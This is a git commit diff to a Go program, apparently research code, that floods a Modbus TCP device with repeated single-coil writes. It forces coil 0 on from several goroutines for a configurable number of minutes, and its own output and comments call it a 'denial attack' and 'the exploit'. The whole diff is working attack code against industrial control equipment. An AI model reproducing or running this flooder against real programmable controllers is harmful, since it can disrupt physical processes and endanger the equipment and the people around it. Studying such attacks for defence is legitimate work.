5f86c728cef0a86b5ec04c2f2f5757bba45076bc
Johnathon Beuter <johnathonbeuter@gmail.com>
2024-06-14 16:06:32 -0400

    Go routine running

--- Research/Go/modbusTest.go
+++ Research/Go/modbusTest.go
@@ -14,11 +14,13 @@ var (
 	ip_address string
 	coil       int
 	coil_val   int
+	runtime    int
 	wait       sync.WaitGroup
 )
 
 func init() {
 	flag.StringVar(&ip_address, "ip_address", "192.168.13.86", "The port on which to listen for connections")
+	flag.IntVar(&runtime, "runtime", 1, "How long the program will run")
 }
 
 func jammer(target modbus.Client) {
@@ -26,20 +28,16 @@ func jammer(target modbus.Client) {
 	for {
 		results, err := target.WriteSingleCoil(0, 0xFF00)
 
-		fmt.Printf("%T\n", results)
 		if err != nil {
 			fmt.Println(err)
-		} else {
 			fmt.Println(results)
 		}
 	}
-	defer wait.Done()
-
 }
 
 func main() {
-
-	handler := modbus.NewTCPClientHandler("192.168.13.86:502")
+	flag.Parse()
+	handler := modbus.NewTCPClientHandler("192.168.13.86:502") //Change this to be a variable
 	handler.Timeout = 10 * time.Second
 
 	err := handler.Connect()
@@ -56,12 +54,16 @@ func main() {
 		go jammer(client)
 	}
 
-	//Runs the exploit for one minute then kills it
-	timer2 := time.NewTimer(1 * time.Minute)
+	fmt.Println("Starting denial attack...")
+	//Runs the exploit for the specified duration
+	timer2 := time.NewTimer(time.Duration(runtime) * time.Minute)
 	go func() {
+
 		<-timer2.C
+		fmt.Println("Denial attack completed")
 		os.Exit(0)
 	}()
 
 	wait.Wait()
+
 }
